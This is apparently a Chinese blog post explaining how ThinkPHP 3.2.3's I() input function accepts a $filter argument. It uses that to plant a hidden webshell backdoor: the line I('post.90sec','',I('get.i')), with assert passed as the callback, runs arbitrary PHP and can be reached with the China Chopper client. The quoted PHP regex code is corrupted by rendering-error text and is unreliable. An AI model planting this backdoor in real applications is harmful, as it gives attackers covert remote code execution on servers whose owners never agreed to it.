## I函数的第三个参数是$filter，作用是对变量的过滤。
### 新版本（3.2.3）中，$filter可以传入两种4种值：
## 1.一个过滤函数（字符串）
## 2.一些过滤函数组成的字符串，其间用“|”分割
## 3.一些过滤函数的字符串组成的数组
## 4.以“/”开头的正则表达式
### 可见代码，若$filter为空的话，其默认值为C('DEFAULT_FILTER')。我们在配置文件中可以看到，DEFAULT_FILTER=htmlspecialchars convention_php_—_thinkphp.png
### 以上4个情况最后归为两个，1是过滤回调函数，2是过滤的正则。正则部分如下：
```PHP
if (0 === strpos(KaTeX parse error: Expected '}', got 'EOF' at end of input: …!== preg_match(filters, (string) KaTeX parse error: Expected '}', got 'EOF' at end of input: … return isset(default) ? KaTeX parse error: Expected 'EOF', got '}' at position 23: … : null; 5	}̲ 6	} 如果第0个字…default。
```
### 而回调函数部分，是我们留后门的关键。I(‘post.90sec’, ‘’, I(‘get.i’));如上，第三个参数就是刚说的$filter，我们只需要把回调后门函数名字（assert）作为第三个参数传入，即可构造一个回调后门。
## 我就拿thinkphp默认的IndexController下的index方法示例：
## IndexController_class_php_—_thinkphp.png
## 如下即可执行任意代码：phpinfo__.png  一个回调后门，菜刀也可以连接